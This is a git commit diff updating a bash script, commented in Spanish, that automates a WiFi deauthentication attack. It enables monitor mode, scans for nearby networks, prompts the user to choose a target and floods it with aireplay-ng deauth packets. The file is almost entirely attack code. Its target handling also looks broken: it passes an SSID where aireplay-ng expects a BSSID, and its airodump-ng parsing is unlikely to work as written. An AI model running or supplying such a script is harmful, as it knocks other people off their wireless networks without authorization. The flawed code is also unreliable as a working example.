09d4e282a9fe3b57ab6f41da6ffada9317e92248
cristianmusica <75284701+cristianmusica@users.noreply.github.com>
2023-12-16 14:54:25 -0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 
 # Colores
-RED="\033[1;31m"
-GREEN="\033[1;32m"  
-YELLOW="\033[1;33m"
+RED="\033[1;31m"  
+GREEN="\033[1;32m"
+YELLOW="\033[1;33m" 
 WHITE="\033[1;37m"
 
-# Interfaz (se puede cambiar según la que se use)  
+# Interfaz WiFi 
 IFACE="wlan0"
 
-# Pone la interfaz en modo monitor
+# Pone interfaz en modo monitor
 enable_monitor() {
 
   airmon-ng check kill
@@ -19,49 +19,50 @@ enable_monitor() {
 
 }
 
-# Regresa la interfaz a modo normal  
+# Regresa la interfaz a modo normal
 disable_monitor() {
 
   ip link set $IFACE down
   iw dev $IFACE set type managed
   ip link set $IFACE up
   service network-manager restart
+  nmcli device connect $IFACE
+
+}
+
+# Encuentra las redes WiFi cercanas  
+get_targets() {
+
+  echo -e "\n${WHITE}Buscando redes WiFi disponibles...${WHITE}\n"
+
+  networks=($(airodump-ng -a --band abg $IFACE | grep -w ESSID | awk -F' ' '{print $2}'))
+
+  echo -e "${WHITE}Redes Encontradas:\n"
+
+  for ((i=0; i<${#networks[@]}; i++)); do
+    echo -e "${RED}$i) ${networks[$i]}"
+  done 
 
 }
 
 # Realiza el ataque deauth
 attack() {
 
-  echo -e "\n${RED}[!] ${WHITE}Iniciando ataque Deauth...${WHITE}\n"
+  echo -e "\n${RED}[+] ${WHITE}Iniciando ataque Deauth a ${YELLOW}$1${WHITE}"
 
-  # -0 2 significa paquetes de deauth indefinidamente
   timeout 60s aireplay-ng -0 2 -a $1 $IFACE
-
-  echo -e "\n${GREEN}[+] ${WHITE}Ataque Deauth finalizado!${WHITE}\n"
-
-}
-
-# Obtiene un SSID de red a atacar
-get_target() {
-
-  networks=($(sudo iwlist $IFACE scan | grep ESSID | awk '{print $2}'))  
-
-  echo -e "${WHITE}Redes disponibles:\n"
-
-  for ((i=0; i<${#networks[@]}; i++)); do
-    echo -e "${RED}$i) ${networks[$i]}"
-  done
-
-  read -p "Ingresa el índice de la red a atacar: " target
+  
+  echo -e "\n${GREEN}[+] ${WHITE}Ataque finalizado!${WHITE}\n"  
 
 }
 
 # Flujo principal
 enable_monitor
+get_targets
 
-get_target
-SSID=${networks[$target]}
+read -p "Ingresa el número de red a atacar: " target
+SSID=${networks[$target]}  
 
-attack $SSID  
+attack $SSID
 
 disable_monitor
